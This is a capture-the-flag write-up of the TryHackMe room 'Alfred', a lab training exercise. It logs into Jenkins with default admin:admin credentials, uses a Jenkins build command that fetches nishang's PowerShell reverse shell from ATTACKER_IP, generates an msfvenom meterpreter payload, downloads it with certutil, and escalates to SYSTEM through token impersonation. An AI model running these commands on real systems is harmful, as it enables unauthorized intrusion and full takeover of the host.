---
title: "Alfred"
date: 2025-03-15
draft: false
summary: "Writeup for Alfred CTF challenge on TryHackMe."
tags: ["windows", "jenkins", "token impersonation"]
categories: ["writeups"]
series: []
showToc: true
cover:
  image: "https://cdn.ziomsec.com/alfred/cover.webp"
  caption: "Alfred TryHackMe Challenge"
  alt: "Alfred cover"
platform: "TryHackMe"
---

Alfred involves exploiting Jenkins to gain an initial shell, then escalate our privileges by exploiting Windows authentication tokens.
<!--more-->
To access **Alfred**, click on the link given below:
- https://tryhackme.com/room/alfred

## Scanning

I performed an **nmap** aggressive scan on the target to identify the open ports and the services running on them.

```shell
nmap -A -p- TARGET --min-rate 10000 -Pn -oN alfred.nmap
```

![](https://cdn.ziomsec.com/alfred/1.webp)

## Initial Foothold

The target had  http service running on port 80 and 8080, so I accessed them through my browser.

![](https://cdn.ziomsec.com/alfred/2.webp)

I found a **jenkins** login page on port 8080.

![](https://cdn.ziomsec.com/alfred/3.webp)

I also viewed the *robots.txt* file that was identified by the **nmap** scan but found nothing. The default username used by `Jenkins` is `admin`, so I tried some default credentials and logged in using `admin:admin`

![](https://cdn.ziomsec.com/alfred/4.webp)

Jenkins is a tool that is used to build and test software automatically. It is used in devops and has the ability to build and run commands as part of a job or pipeline. Since I got access to it, I could execute code to get a reverse shell. I downloaded the `Invoke-PowerShellTcp.ps1` script from **nishang**.
- https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1

I then started an http server to host the powershell script.

```shell
python3 -m http.server 80
```

![](https://cdn.ziomsec.com/alfred/5.webp)

On **Jenkins**, I created a new project -> new build and then added a command for it to download the reverse shell script and send a shell to my system.

![](https://cdn.ziomsec.com/alfred/6.webp)

I used the following command:

```
powershell.exe iex (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/Invoke-PowerShellTcp -Reverse -IPAddress ATTACKER_IP -Port ATTACKER_PORT)
```

![](https://cdn.ziomsec.com/alfred/7.webp)

Finally, I started a **netcat** listener and built the project.

![](https://cdn.ziomsec.com/alfred/8.webp)

![](https://cdn.ziomsec.com/alfred/9.webp)

I got a reverse shell from the target and captured the user flag from *`C:\Users\bruce\Desktop`*.

![](https://cdn.ziomsec.com/alfred/10.webp)

![](https://cdn.ziomsec.com/alfred/11.webp)

## Privilege Escalation

I viewed my privileges and found that I had `SeImpersonatePrivilege`. This allowed me to impersonate certain logged-in users.

```shell
whoami /priv
```

![](https://cdn.ziomsec.com/alfred/12.webp)

**Metasploit**'s **incognito** module could be used to exploit this, so I created a payload using **msfvenom** and executed it on the target to get a **meterpreter** shell.

```shell
$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 -e x86/shikata_ga_nai LHOST=ATTACKER_IP LPORT=ATTACKER_PORT -f exe -o rev.exe
# start a web server
$ python3 -m http.server 8080
```

![](https://cdn.ziomsec.com/alfred/13.webp)

![](https://cdn.ziomsec.com/alfred/14.webp)

> The payload can be downloaded on the target using `certutil.exe -urlcache -split -f http://ATTACKER:PORT/rev.exe`

![](https://cdn.ziomsec.com/alfred/15.webp)

After getting **meterpreter** shell, I loaded the **incognito** module for token impersonation.

```shell
load incognito
```

![](https://cdn.ziomsec.com/alfred/16.webp)

I then listen available tokens and Found `NT AUTHORITY\SYSTEM`. I then impersonated the account and got SYSTEM access.

```shell
$ list_tokens -u
$ imperosnate_token "NT AUTHORITY\SYSTEM"
$ getuid
```

![](https://cdn.ziomsec.com/alfred/17.webp)

I had a 32 bit session so I upgraded it to 64 bit by migrating to a 64 bit process. This was required because a 32 bit meterpreter process cannot host 64 bit code or fully interact with 64 bit only parts of Windows.

```
$ pgrep services.exe
$ migrate 668
$ sysinfo
```

Finally, I captured the root flag from `C:\Windows\System32\config\root.txt`

```shell
$ cat C:/Windows/System32/config/root.txt
```

![](https://cdn.ziomsec.com/alfred/18.webp)

## Closure

Here's a short summary of how I pwned Alfred:
- I discovered a Jenkins instance running on port 8080.
- I was able to log into Jenkins using `admin:admin`
- I ran a job to run `Invoke-PowerShellTcp.ps1` and got a reverse shell.
- I captured the first flag from `bruce`'s Desktop.
- Additional enumeration revealed that I had `SeImpersonatePrivilege`
- I used an **msfvenom** payload to get a **meterpreter** shell.
- I used the `incognito` module to get the NT Authority token.
- I captured the final flag from `System32` directory.

---
